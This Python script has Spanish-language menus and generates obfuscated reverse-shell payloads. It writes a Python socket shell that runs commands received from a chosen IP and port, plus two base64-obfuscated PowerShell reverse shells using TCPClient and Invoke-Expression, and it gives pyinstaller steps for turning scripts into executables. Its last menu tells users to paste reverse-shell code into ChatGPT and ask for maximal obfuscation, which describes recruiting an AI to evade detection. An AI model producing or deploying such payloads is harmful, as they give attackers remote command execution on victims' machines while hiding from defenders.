import random
import time
import base64

while True:

    colors = [
        "\033[31m",  
        "\033[32m",  
        "\033[33m",  
        "\033[34m",  
        "\033[35m", 
        "\033[36m",  
        "\033[37m"   
    ]


    word = "Ofuscation"



    banner = ""
    for char in word:
        banner += random.choice(colors) + char

    banner += "\033[0m"


    print("=" * 50)
    print(banner)
    print("=" * 50)

    time.sleep(3)


    colors = [
        "\033[31m",  
        "\033[32m",  
        "\033[33m",  
        "\033[34m",  
        "\033[35m",  
        "\033[36m",  
        "\033[37m"   
    ]


    word = "VENTANA"



    banner = ""
    for char in word:
        banner += random.choice(colors) + char


    banner += "\033[0m"

    time.sleep(2)

    menu = """
    1 -> ofuscation python
    2 -> ofuscation de powershell
    3 -> como generar un .exe en python
    """


    print("=" * 50)
    print(banner)
    print("=" * 50)
    time.sleep(2)
    print(menu)
    time.sleep(2)
    klk = int(input("obf>  "))

    if klk == 1:
    
        colors = [
            "\033[31m",  
            "\033[32m",  
            "\033[33m",  
            "\033[34m",  
            "\033[35m",  
            "\033[36m",  
            "\033[37m"   
        ]


        word = "CREANDO ARCHIVO"



        banner = ""
        for char in word:
            banner += random.choice(colors) + char

        banner += "\033[0m"


        print("=" * 50)
        print(banner)
        print("=" * 50)

        kl = "dime la ip "
        print(kl)

        ip = input("dimelo ")

        j = "dime el puerto "
        print(j)

        puerto = input("dimelo ")

        with open("ofuscation.py","a") as file:
            file.writelines([f"""import socket
import subprocess
ip = ('{ip}',{puerto})

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(ip)

while True:
    ki = s.recv(2024).decode()
    
    k = subprocess.check_output(ki ,shell=True, stderr=subprocess.STDOUT)

    s.send(k)



s.close()"""])
    
    elif klk == 2:
       
        pi = input("dime la ip ")
        p = input("dime el puerto  ")

        encoded = base64.b64encode(pi.encode())
        lol = base64.b64encode(p.encode())

        print("esta es la ip ",encoded.decode())
        print("este esl peurto ",lol.decode())
        time.sleep(2)

        with open("ofuscantion.ps1","a") as file:                                               #aqui ip y puereto
            file.writelines([f"""$a = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{encoded}")) # "10.0.0.178" 
$b = [int]([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{lol}")))    # 4444
$c = New-Object ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TmV0LlNvY2tldHMuVENQQ2xpZW50")))($a, $b)
$d = $c.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("R2V0U3RyZWFt")))()
$e = New-Object ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SU8uU3RyZWFtV3JpdGVy")))($d)

function Invoke-Obfuscated {{
    param ($s)
    [byte[]]$script:Buffer = 0..$c.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVjZWl2ZUJ1ZmZlclNpemU="))) | % {0}
    $e.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("V3JpdGU=")))($s + [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U0hFTEx+Pg==")))
    $e.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Rmx1c2g=")))()
}}

Invoke-Obfuscated ''

while (($f = $d.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVhZA==")))($Buffer, 0, $Buffer.Length)) -gt 0) {{
    $g = ([Text.Encoding]::UTF8).([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("R2V0U3RyaW5n")))($Buffer, 0, $f - 1)
    $h = try {{
        Invoke-Expression $g 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    Invoke-Obfuscated $h
}}

$e.([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2xvc2U=")))()
"""])
    
    elif klk == 3:
        ja = "te voy a crear un archivo .txt que se va a llamar convertidor_de_python_a_exe.txt"

        print(ja)
        time.sleep(2)
        with open("convertidor_de_python_a_exe.txt","a") as file:
            file.writelines(["""1 - pip install pyinstaller
                             2 - pyinstaller --clean --onefile --windowed k.py <-aqui el archivo .py
                             3 - se te va a crear un directorio build o dist """])
    
    colors = [
            "\033[31m",  
            "\033[32m",  
            "\033[33m",  
            "\033[34m",  
            "\033[35m",  
            "\033[36m",  
            "\033[37m"   
        ]


    word = "SEGUNDO APARTADO"



    banner = ""
    for char in word:
        banner += random.choice(colors) + char

        banner += "\033[0m"


    print("=" * 50)
    print(banner)
    print("=" * 50)
    time.sleep(3)


    print("""
          \nsegundo apartado 
        1 -> segundo codigo de powershell
        2 -> pasos para encriptar un codigo powershell""")
    k = int(input("obf> "))
    if k == 1:
        da = input("dime la ip ")
        po = input("dime el puerto  ")

        en = base64.b64encode(pi.encode())
        lo = base64.b64encode(p.encode())

        print("esta es la ip ",en.decode())
        print("este esl peurto ",lo.decode())
        time.sleep(2)
        
        with open("powershell.ps1","a") as file:
            file.writelines([f"""$a = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{en}"))  
$b = [int]([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{lo}")))
$c = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TmV0LlNvY2tldHMuVENQQ2xpZW50")))($a, $b)
$d = $c.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("R2V0U3RyZWFt")))()
$e = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SU8uU3RyZWFtUmVhZGVy")))($d)
$f = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SU8uU3RyZWFtV3JpdGVy")))($d)
$f.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QXV0b0ZsdXNo"))) = $true
$g = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLkJ5dGVbXQ=="))) 1024
while ($c.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q29ubmVjdGVk")))) {{
    while ($d.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("RGF0YUF2YWlsYWJsZQ==")))) {{
        $h = $d.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVhZA==")))($g, 0, $g.Length)
        $i = ([System.Text.Encoding]::UTF8).([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("R2V0U3RyaW5n")))($g, 0, $h - 1)
    }}
    if ($c.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q29ubmVjdGVk"))) -and $i.Length -gt 1) {{
        $j = try {{
            Invoke-Expression ($i) 2>&1
        }} catch {{
            $_
        }}
        $f.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("V3JpdGU=")))(("$j`n"))
        $i = $null
    }}
}}
$c.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2xvc2U=")))()
$d.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2xvc2U=")))()
$e.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2xvc2U=")))()
$f.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2xvc2U=")))()
"""])
    elif k == 2:
        print("pasos 1 - ve a la pagina de revershell generator y cpoia el codigo powershell")
        time.sleep(2)
        print("pasos 2 - una vez tenga el codigo ve a chatgpt y pon \n ofuscame este codigo lo maxiomo posible que sea dificil de entender")